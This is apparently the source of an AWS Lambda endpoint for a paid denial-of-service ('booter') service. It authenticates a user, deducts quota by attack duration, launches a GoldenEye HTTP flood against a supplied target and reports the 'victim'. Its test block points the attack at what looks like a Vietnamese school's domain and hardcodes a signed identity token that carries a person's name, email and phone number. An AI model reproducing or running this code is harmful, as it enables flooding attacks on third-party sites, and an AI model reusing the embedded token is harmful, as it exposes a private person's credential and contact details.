
import json
import auth, quota
import goldeneye

def lambda_handler(event, context):
  target = event['queryStringParameters'].get('target', False)
  if target[0:4].lower() != 'http':
    target = 'http://'+target
  duration = int(event['queryStringParameters'].get('duration', 0))
  strength = int(event['queryStringParameters'].get('strength', 10))
  id_token = event['queryStringParameters'].get('id_token', False)
  
  options = {
    'target': target,
    'duration': duration,
    'strength': strength
  }
  print('options', options)
  
  if not id_token:
    return errorMessage('You are not authorized to make this request')
  
  user_info = auth.get_user(id_token)
  # print('user_info', user_info)

  if not user_info:
    return errorMessage('You are not authorized to make this request')

  username = user_info['cognito:username']
  
  q = quota.get_quota(username)
  # print('quota', q)
  
  if q['free_quota'] + q['paid_quota'] < duration:
    return errorMessage('You do not have enough quota for this action')

  reduce_quota_response = quota.reduce_quota(username, q, duration)
  # print('reduced quota', reduce_quota_response)
  goldeneye.attack(options)
  
  return {
    'statusCode': 200,
    'body': json.dumps({
      'success': True,
      'victim': target,
      'attackEndAfter': duration,
      #'numberOfPacketsSent': packetsSent,
      #'numberOfPacketsFailed': packetsFailed
    })
  }


id_token = 'eyJraWQiOiJCbjk4ZEF3ajNUVG1scUNkc21XY1wvakoxVU01eDJWaHFiMGk5c0dzSmJyUT0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIyNDA0YTQ0YS04Mjc2LTRjMjctYTNlMy1mMTdkZDlkZDViMzYiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLmFwLXNvdXRoZWFzdC0xLmFtYXpvbmF3cy5jb21cL2FwLXNvdXRoZWFzdC0xXzA5OW5oamlsbiIsInBob25lX251bWJlcl92ZXJpZmllZCI6ZmFsc2UsImNvZ25pdG86dXNlcm5hbWUiOiIyNDA0YTQ0YS04Mjc2LTRjMjctYTNlMy1mMTdkZDlkZDViMzYiLCJhdWQiOiIzczM3cWNhYjRiZGlicGw3dXM4NXA4bnNyNyIsImV2ZW50X2lkIjoiZjExZWFkZmUtZmI4Mi0xMWU4LTgxNjQtNGRkOWRlNGNkYTRmIiwidG9rZW5fdXNlIjoiaWQiLCJhdXRoX3RpbWUiOjE1NDQzNDAwNDQsIm5hbWUiOiJDaHJpc3RpYW4gV2VuIiwicGhvbmVfbnVtYmVyIjoiKzg0ODM5Njg0NDM0IiwiZXhwIjoxNTQ0MzcxMjg0LCJpYXQiOjE1NDQzNjc2ODQsImVtYWlsIjoiY2hyaXN0aWFud2VuMThAZ21haWwuY29tIn0.YK-KuUPkbDN68VKlVyJ9m668-lHX-Ggs9FuYuqX7WOQ2YQhwG4Hk4JfsnSdnkAG5c875EJSu2SNuiXHMfMlmzRvmvAeRF7N0YXIpaKkpNbEylp83JsiRC7eSzu2t2lAoAr6R4ReJkUee6AQ56kYr8-b-9d9h3WEK6wy3ACNY38wAPX2n3B5BbnD7w1skWUA-qwY9kKYF9Zsv36LOexjQ9xvhBDQNJdq-44AJOkKDiLLzuC-UHixWBv0r-ks3gEmaPzKOMHmxORnx25HMkdBD9htUzYACmMLO9fel6nJAZSxoG6ViuJKWh-HgMj7SsNvkwwq4sCZ-7dGxBoN2vTPVlQ'
event = {
  "queryStringParameters": {
    "target": "c3chuvanan.edu.vn",
    "duration": 25,
    "id_token": id_token
  }
}

def errorMessage(message):
  return {
    'statusCode': 200,
    'body': json.dumps({
      'success': False,
      'error': message
    })
  }

if __name__ == '__main__':
  result = lambda_handler(event, {})
  print('result', result)